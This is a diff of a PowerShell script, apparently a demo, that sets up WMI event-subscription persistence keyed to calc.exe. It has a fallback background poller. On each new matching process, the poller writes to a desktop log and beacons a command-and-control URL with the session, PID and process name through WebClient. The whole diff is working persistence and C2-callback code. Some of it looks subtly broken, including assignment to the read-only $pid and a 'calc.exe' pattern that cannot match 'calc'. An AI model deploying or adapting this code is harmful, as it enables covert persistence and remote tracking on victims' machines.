@@ -635,26 +635,46 @@ function Start-PersistentProcessPoller {
         [string]$DesktopPath,
         [string]$C2Url,
         [string]$SessionId,
-        [int]$PollInterval = 1
+        [int]$PollInterval = 1,
+        [string[]]$TargetProcessNames = @('calc','Calculator','ApplicationFrameHost')
     )
-
     $sb = {
-        param($dp,$c2Url,$sid,$pollInterval)
+        param($dp,$c2Url,$sid,$pollInterval,$names)
         $known = @()
-        try { $known = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id } catch { $known = @() }
+        try {
+            $procList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName
+            foreach ($p in $procList) {
+                if ($names -and $names.Count -gt 0) {
+                    foreach ($n in $names) { if ($p.ProcessName -imatch $n) { $known += $p.Id; break } }
+                } else { $known += $p.Id }
+            }
+        } catch { $known = @() }
+
         while ($true) {
             Start-Sleep -Seconds $pollInterval
-            try { $current = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id } catch { $current = @() }
-            $added = $current | Where-Object { $known -notcontains $_ }
-            if ($added) {
-                foreach ($pid in $added) {
+            try { $currentList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName } catch { $currentList = @() }
+            $added = @()
+            foreach ($p in $currentList) {
+                if ($names -and $names.Count -gt 0) {
+                    $match = $false
+                    foreach ($n in $names) { if ($p.ProcessName -imatch $n) { $match = $true; break } }
+                    if (-not $match) { continue }
+                }
+                if ($known -notcontains $p.Id) { $added += $p }
+            }
+
+            if ($added.Count -gt 0) {
+                foreach ($proc in $added) {
                     try {
-                        $line = "Polling detected new PID $pid at $(Get-Date -Format o) by session $sid`r`n"
+                        $pid = $proc.Id
+                        $pname = $proc.ProcessName
+                        $line = "Polling detected new process $pname (PID $pid) at $(Get-Date -Format o) by session $sid`r`n"
                         [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $line)
-                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid") > $null } catch {}
+                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid&proc=$pname") > $null } catch {}
                     } catch {}
                 }
-                $known = $current
+                # add newly-observed ids so we don't report them again
+                foreach ($proc in $added) { $known += $proc.Id }
             }
         }
     }
@@ -668,7 +688,7 @@ function Start-PersistentProcessPoller {
         }
     } catch { }
 
-    Start-Job -Name $JobName -ScriptBlock $sb -ArgumentList $DesktopPath,$C2Url,$SessionId,$PollInterval
+    Start-Job -Name $JobName -ScriptBlock $sb -ArgumentList $DesktopPath,$C2Url,$SessionId,$PollInterval,$TargetProcessNames
 }
 
 function Show-WMIEventSub {
@@ -738,7 +758,8 @@ try {
             $filterInstance = $filterClass.CreateInstance()
             $filterInstance.Name = $EventName
             # Exclude PowerShell process names to avoid recursive triggers
-            $filterInstance.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name != 'powershell.exe' AND TargetInstance.Name != 'pwsh.exe'"
+            # Only trigger for Calculator to avoid noisy system process events
+            $filterInstance.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'calc.exe'"
             $filterInstance.QueryLanguage = "WQL"
             $filterInstance.EventNamespace = "root\cimv2"
             $filterResult = $filterInstance.Put()
@@ -750,7 +771,8 @@ try {
             Write-Host "    [*] Attempting session-based (non-persistent) fallback using Register-CimIndicationEvent/Register-WmiEvent." -ForegroundColor Yellow
 
             # Prepare session-based fallback variables (use Win32_ProcessStartTrace for reliability)
-            $query = "SELECT * FROM Win32_ProcessStartTrace"
+            # Narrow session-based query to the target process (calc.exe) to avoid excessive triggers
+            $query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'calc.exe'"
             $source = "DemoWmi_$($Global:UniqueId)"
             $c2Url = $Global:C2Url
             $sid = $Global:UniqueId
@@ -847,7 +869,7 @@ try {
             if ($registered) {
                 # Basic immediate test: spawn calc and see if the payload creates the desktop file
                 Write-Host "    [*] Running quick test trigger (starting calc.exe)..." -ForegroundColor Gray
-                # Start-Process calc.exe -NoNewWindow
+                Start-Process calc.exe -NoNewWindow
                 Start-Sleep -Seconds 3
                 if (Test-Path (Join-Path $dp 'calcLOG.txt')) {
                     Write-Host "    [OK] Session-based WMI action executed: calcLOG.txt created." -ForegroundColor Green
@@ -855,9 +877,9 @@ try {
                 else {
                     Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt). Starting persistent poller as backup." -ForegroundColor Yellow
                     # Start a background poller to catch events repeatedly if the event action isn't firing as expected
-                    $jobName = "DemoWmiPoller_$($Global:UniqueId)"
-                    Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 | Out-Null
-                    try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
+                            $jobName = "DemoWmiPoller_$($Global:UniqueId)"
+                            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessName 'calc.exe' | Out-Null
+                            try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 return
             }
@@ -865,7 +887,7 @@ try {
             # Polling fallback: no registration possible, start a persistent poller job
             Write-Host "    [*] Session registration unavailable; starting persistent polling fallback." -ForegroundColor Yellow
             $jobName = "DemoWmiPoller_$($Global:UniqueId)"
-            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 | Out-Null
+            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessName 'calc.exe' | Out-Null
             try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
             Write-Host "    [OK] Poller started (Job Name: $jobName)." -ForegroundColor Green
             return
